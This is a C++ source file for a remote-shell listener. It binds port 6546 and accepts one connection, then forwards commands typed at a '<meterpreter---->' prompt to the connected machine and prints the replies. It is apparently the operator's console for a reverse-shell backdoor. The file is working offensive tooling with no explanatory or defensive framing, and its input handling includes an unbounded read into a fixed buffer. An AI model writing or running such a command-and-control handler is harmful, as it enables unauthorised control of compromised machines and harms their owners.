#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <iostream>
#include <fstream>
#include <strings.h>
#include <stdlib.h>
#include <string>
#include <pthread.h>
using namespace std;

void* listenThread(void*);

int main(int argc, char* argv[])
{
    pthread_t listenSock;
    int listenFd, clientSock;
    socklen_t len; //store size of the address
    struct sockaddr_in svrAdd, clntAdd;
    
    listenFd = socket(AF_INET, SOCK_STREAM, 0);
    
    if(listenFd < 0)
    {
        cerr << "Cannot open socket" << endl;
        return 0;
    }
    
    bzero((char*) &svrAdd, sizeof(svrAdd));
    
    svrAdd.sin_family = AF_INET;
    svrAdd.sin_addr.s_addr = INADDR_ANY;
    svrAdd.sin_port = htons(6546);
    
    //bind socket
    if(bind(listenFd, (struct sockaddr *)&svrAdd, sizeof(svrAdd)) < 0)
    {
        cerr << "Cannot bind" << endl;
        // return 0;
    }
    
    listen(listenFd, 1);
    
    len = sizeof(clntAdd);

    cout << "Listening" << endl;

    string str;
    clientSock = accept(listenFd, (struct sockaddr *)&clntAdd, &len);
    pthread_create(&listenSock, NULL, listenThread, (void*)&clientSock);
    char buffer[255];
    string compare;
    cout << "connected !! " << endl;
    
    while (1)
    {
        sleep(1);
        cout << "\n";
        cout << "<meterpreter---->";
        cin >> buffer;
        compare = buffer;
        if (compare == "exit")
        {
            string input;
            cout << "Do you want to close listener ? (y/n) :";
            cin  >> input;
            if (input == "y")
                break;
        }
        else if (compare == "clear")
            system("clear");
        else 
            send(clientSock, buffer, sizeof(buffer), 0);
        bzero(buffer, sizeof(buffer));
    }
    pthread_cancel(listenSock);
    close(clientSock);
    close(listenFd);
    return 0;
    
}

void* listenThread(void* sock)
{
    int c = *(int*)sock;
    char buffer[4096];
    while(1)
    {
        recv(c, buffer, sizeof(buffer), 0);
        fputs(buffer, stdout);
        fputs("\n", stdout);
        bzero(buffer, sizeof(buffer));
    }
}


























































